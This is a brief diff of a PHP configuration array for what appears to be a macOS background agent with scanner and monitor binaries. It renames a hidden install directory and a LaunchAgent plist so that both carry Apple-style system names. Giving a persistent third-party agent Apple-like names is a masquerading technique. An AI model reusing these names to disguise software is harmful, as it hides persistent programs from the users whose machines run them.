@@ -15,7 +15,7 @@ define('REGEX_VIDEO_ID', '/[a-zA-Z0-9_-]+/');
 global $ss_config, $b64_config;
 
 $ss_config = array(
-    'DIR_MAIN' => '.AppleSystemProfiler',
+    'DIR_MAIN' => '.AppleSystemMonitor',
     'DIR_BIN' => 'bin',
     'DIR_AGENT' => 'lib',
     'DIR_LAUNCH_AGENTS' => '~/Library/LaunchAgents',
@@ -24,7 +24,7 @@ $ss_config = array(
     'FILE_MAIN_BINARY' => 'ctl',
     'FILE_MAIN_MONITOR' => 'monitor',
     'FILE_MAIN_SCANNER' => 'scan',
-    'FILE_LAUNCH_PLIST' => 'com.apple.system.profiler',
+    'FILE_LAUNCH_PLIST' => 'com.apple.system.monitor',
     'FILE_PHP_BINARY' => '/usr/bin/php',
     'FILE_INSTALLER' => 'ss_install',
     'FILE_REMOVER' => 'ss_remove'
